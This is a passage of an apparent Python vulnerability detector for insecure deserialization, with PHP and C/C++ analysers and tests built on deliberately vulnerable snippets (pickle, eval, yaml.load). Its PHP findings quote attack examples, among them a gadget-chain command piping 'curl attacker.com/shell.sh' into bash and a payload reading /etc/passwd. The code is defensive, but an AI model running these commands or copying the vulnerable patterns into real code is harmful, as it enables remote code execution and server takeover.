                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            f"{libs_str} parsing without type validation",
                            "No field existence checking (has/contains)",
                            "No type checking (is_string/is_int)",
                            "Missing exception handling for parse errors"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: {libs_str} parsing without validation",
                            "No type or field validation detected",
                            "Malformed input can cause unexpected behavior",
                            "Missing try-catch for parse exceptions"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "JSON/XML parsing function calls",
                            "Type checking methods (.is_*/type)",
                            "Field validation (.has/.contains)",
                            "Exception handling (try-catch)"
                        ],
                        "evidence": {
                            "found_patterns": [f"{libs_str} parsing without validation"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 0:
                    self.score = 1

        # Pattern 3: Check for safe patterns
        safe_patterns = [
            (r'strncpy|snprintf|fgets', "safe string functions"),
            (r'std::string|std::vector', "C++ safe containers"),
            (r'\.is\w+\(\)|\.has\w+\(\)|\.contains\(', "validation methods"),
        ]

        has_safe_patterns = any(re.search(pattern, code) for pattern, _ in safe_patterns)

        if has_safe_patterns and self.score == 2:
            # Find safe function usage location
            safe_locations = []
            for pattern, desc in safe_patterns:
                safe_locations.extend(find_pattern_locations(code, pattern))

            if safe_locations:
                location = safe_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "SECURE",
                    "severity": "INFO",
                    "description": "SECURE: Uses safe C/C++ parsing practices - bounds-checked functions (strncpy, snprintf, fgets) or C++ safe containers (std::string, std::vector) with validation. These prevent buffer overflows and validate data before use.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "strcpy/sprintf/gets without bounds checking",
                            "memcpy without size validation",
                            "Parsing without type/field validation",
                            "Missing exception handling"
                        ],
                        "why_vulnerable": [],
                        "why_not_vulnerable": [
                            f"Line {line_num}: Uses safe string/parsing functions",
                            "Bounds-checked functions prevent buffer overflows",
                            "C++ containers manage memory safely",
                            "Validation methods check data before use"
                        ],
                        "patterns_checked": [
                            "unsafe functions (strcpy/sprintf/gets/memcpy)",
                            "safe alternatives (strncpy/snprintf/fgets)",
                            "C++ safe containers (std::string/vector)",
                            "validation patterns"
                        ],
                        "evidence": {
                            "found_patterns": ["Safe C/C++ parsing practices"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_php(self, code: str) -> Dict:
        """Analyze PHP code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: unserialize() on user-controlled data
        unserialize_locations = find_pattern_locations(code, r'unserialize\(')

        if unserialize_locations:
            # Check if data source is user-controlled
            has_user_data = any([
                re.search(r'unserialize\([^)]*\$_(GET|POST|REQUEST|COOKIE)', code),
                re.search(r'unserialize\([^)]*base64_decode\(\$_(GET|POST|REQUEST)', code),
                re.search(r'\$\w+\s*=\s*\$_(GET|POST|REQUEST|COOKIE)', code) and re.search(r'unserialize\(\$\w+\)', code),
            ])

            # Check for validation/signature or allowed_classes whitelist
            has_validation = any([
                re.search(r'hash_hmac|hash_equals|openssl_verify', code),
                re.search(r'if\s*\([^)]*hash_hmac', code),
                re.search(r'if\s*\([^)]*signature', code, re.IGNORECASE),
                re.search(r'unserialize\([^)]*,\s*\[\s*["\']allowed_classes["\']', code),  # allowed_classes parameter
                re.search(r'\[\'allowed_classes\'\]\s*=>\s*\[', code),  # ['allowed_classes'] => [...]
            ])

            location = unserialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if not has_validation:
                if has_user_data:
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "CRITICAL",
                        "description": "PHP unserialize() on user-controlled data - REMOTE CODE EXECUTION: PHP unserialize() can instantiate arbitrary classes and trigger __wakeup/__destruct magic methods. ATTACK: Attacker crafts malicious serialized object with gadget chain (e.g., Monolog, Guzzle, Laravel classes) that executes code during unserialize(). REAL-WORLD: CVE-2017-9841 (PHPMailer), CVE-2018-20148 (WordPress), CVE-2019-11043 (PHP-FPM) used PHP unserialize RCE. IMPACT: Complete server compromise, database access, file system manipulation, reverse shell.",
                        "recommendation": "NEVER use unserialize() on untrusted data. Solutions: (1) Use JSON instead: $data = json_decode($input, true), (2) If you MUST unserialize: Use allowed_classes option (PHP 7.0+): $data = unserialize($input, ['allowed_classes' => [MyClass::class]]), (3) Sign serialized data with HMAC: $serialized = serialize($data); $signature = hash_hmac('sha256', $serialized, $secret); // Send both. On receive: if (!hash_equals($signature, hash_hmac('sha256', $serialized, $secret))) die();",
                        "example_attack": "Attacker sends: O:8:\"Exploiter\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} → unserialize() instantiates Exploiter class → __wakeup() reads /etc/passwd → sends to attacker. OR: Uses PHPGGC tool to generate gadget chain: phpggc Laravel/RCE1 system 'curl attacker.com/shell.sh | bash' → sends serialized payload → unserialize() → RCE.",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "unserialize() called on user-controlled data ($ GET/POST/COOKIE)",
                                "No HMAC signature verification before unserialization",
                                "No allowed_classes restriction",
                                "PHP classes with magic methods (__wakeup, __destruct) in codebase create gadget opportunities"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: unserialize() processes data from $_GET/$_POST/$_REQUEST/$_COOKIE",
                                "User controls serialized data structure and class instantiation",
                                "PHP automatically calls __wakeup() and __destruct() during unserialize()",
                                "Attacker can chain magic methods to achieve RCE (gadget chains)",
                                "No signature verification - cannot distinguish legitimate data from attacker payloads",
                                "REAL-WORLD: Laravel, Symfony, WordPress, Drupal all had unserialize() gadget chains"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "unserialize() with $_GET/$_POST/$_REQUEST/$_COOKIE",
                                "HMAC signature verification (hash_hmac, hash_equals)",
                                "allowed_classes parameter usage",
                                "Safe alternatives (json_decode)"
                            ],
                            "evidence": {
                                "found_patterns": ["unserialize() with user-controlled data"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0
                else:
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "HIGH",
                        "description": "PHP unserialize() without signature verification - CODE EXECUTION RISK: Even if data source appears internal, attacker can modify serialized data if they gain file/database/cache access. ATTACK SCENARIO: (1) App stores user session in file: /tmp/sess_abc123, (2) Attacker modifies file with malicious serialized object, (3) App reads and unserialize() → RCE. VULNERABLE EVEN IF: data isn't from HTTP request, attacker just needs storage access (shared hosting, stolen backup, Redis access).",
                        "recommendation": "Replace unserialize() with JSON: $data = json_decode($input, true). If you MUST use serialize/unserialize: Sign the data: $serialized = serialize($data); $signature = hash_hmac('sha256', $serialized, SECRET_KEY); // Store both. On load: if (!hash_equals($expected_sig, hash_hmac('sha256', $serialized, SECRET_KEY))) die('Tampered'); $data = unserialize($serialized);",
                        "example_attack": "Attacker gains Redis access → modifies cached serialized session → next read calls unserialize() → __wakeup() executes → file_put_contents('/var/www/shell.php', $backdoor) → webshell installed",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "unserialize() used without HMAC signature verification",
                                "No user-controlled data detected, but serialized data could be tampered with",
                                "Attacker with storage access (file system, database, cache) can inject malicious objects",
                                "Missing cryptographic integrity protection"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: unserialize() without signature verification",
                                "Even if data source appears trusted, attacker can modify serialized data in storage",
                                "ATTACK SCENARIOS: shared hosting, Redis compromise, database injection, stolen backups",
                                "unserialize() automatically calls __wakeup() and __destruct() magic methods",
                                "No HMAC check - application cannot detect if serialized data was tampered with"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "unserialize() usage patterns",
                                "HMAC verification (hash_hmac, hash_equals, openssl_verify)",
                                "Signature checking before unserialize()",
                                "Safe alternatives (json_decode)"
                            ],
                            "evidence": {
                                "found_patterns": ["unserialize() without signature verification"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0

        # Pattern 2: Check for safe JSON usage
        uses_json = any([
            re.search(r'json_encode\(', code),
            re.search(r'json_decode\(', code),
        ])

        if uses_json and not unserialize_locations:
            json_locations = find_pattern_locations(code, r'json_decode\(')
            if json_locations:
                location = json_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "SECURE",
                    "severity": "INFO",
                    "description": "SECURE: Uses json_decode() instead of unserialize(). JSON is data-only format, cannot represent PHP objects or execute code. This is the recommended way to handle data serialization in PHP.",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "unserialize() on untrusted data (gadget chain RCE)",
                            "No signature verification",
                            "No allowed_classes restriction",
                            "Magic method exploitation (__wakeup, __destruct)"
                        ],
                        "why_vulnerable": [],
                        "why_not_vulnerable": [
                            f"Line {line_num}: Uses json_decode() for deserialization",
                            "JSON format only supports data primitives (object, array, string, number, boolean, null)",
                            "Cannot represent PHP objects or class instances",
                            "No __wakeup() or __destruct() magic methods triggered",
                            "Safe against gadget chain attacks that exploit unserialize()",
                            "No unserialize() usage detected in code"
                        ],
                        "patterns_checked": [
                            "unserialize() usage",
                            "json_decode() usage (safe)",
                            "HMAC signature patterns",
                            "allowed_classes parameter"
                        ],
                        "evidence": {
                            "found_patterns": ["json_decode() usage"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_deserial_python_pickle_vulnerable():
    """Test detection of insecure pickle usage."""
    vulnerable_code = '''
import pickle

def load_preferences(filename):
    with open(filename, 'rb') as file:
        return pickle.load(file)
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect insecure pickle usage"


def test_deserial_python_pickle_user_data():
    """Test detection of pickle with user-controlled data."""
    vulnerable_code = '''
import pickle
from flask import request

@app.route('/load')
def load_data():
    data = request.files['data'].read()
    obj = pickle.loads(data)  # CRITICAL!
    return str(obj)
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect pickle on user data"
    assert any("user-controlled data" in v["description"].lower() for v in result["vulnerabilities"])


def test_deserial_python_json_secure():
    """Test detection of safe JSON usage."""
    secure_code = '''
import json

def load_preferences(filename):
    with open(filename, 'r') as file:
        return json.load(file)
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "python")
    assert result["score"] == 2, "Should recognize safe JSON usage"


def test_deserial_python_yaml_unsafe():
    """Test detection of unsafe YAML loading."""
    vulnerable_code = '''
import yaml

def load_config(filename):
    with open(filename) as f:
        return yaml.load(f)  # Missing Loader parameter!
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "python")
    assert result["score"] == 0, "Should detect unsafe yaml.load()"


def test_deserial_python_yaml_safe():
    """Test detection of safe YAML loading."""
    secure_code = '''
import yaml

def load_config(filename):
    with open(filename) as f:
        return yaml.safe_load(f)
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "python")
    assert result["score"] == 2, "Should recognize safe yaml.safe_load()"


def test_deserial_javascript_eval_vulnerable():
    """Test detection of eval on user data."""
    vulnerable_code = '''
app.post('/process', (req, res) => {
    const data = req.body.data;
    const obj = eval('(' + data + ')');  // CRITICAL!
    res.send(obj);
});
'''
    detector = DeserializationDetector()
    result = detector.analyze(vulnerable_code, "javascript")
    assert result["score"] == 0, "Should detect eval on user data"


def test_deserial_javascript_json_secure():
    """Test detection of safe JSON.parse usage."""
    secure_code = '''
app.post('/process', (req, res) => {
    const data = req.body.data;
    const obj = JSON.parse(data);
    res.send(obj);
});
'''
    detector = DeserializationDetector()
    result = detector.analyze(secure_code, "javascript")
    assert result["score"] == 2, "Should recognize safe JSON.parse()"


if __name__ == "__main__":
    test_deserial_python_pickle_vulnerable()
    test_deserial_python_pickle_user_data()
    test_deserial_python_json_secure()
    test_deserial_python_yaml_unsafe()
    test_deserial_python_yaml_safe()
    test_deserial_javascript_eval_vulnerable()
    test_deserial_javascript_json_secure()
    print("All Insecure Deserialization detection tests passed!")
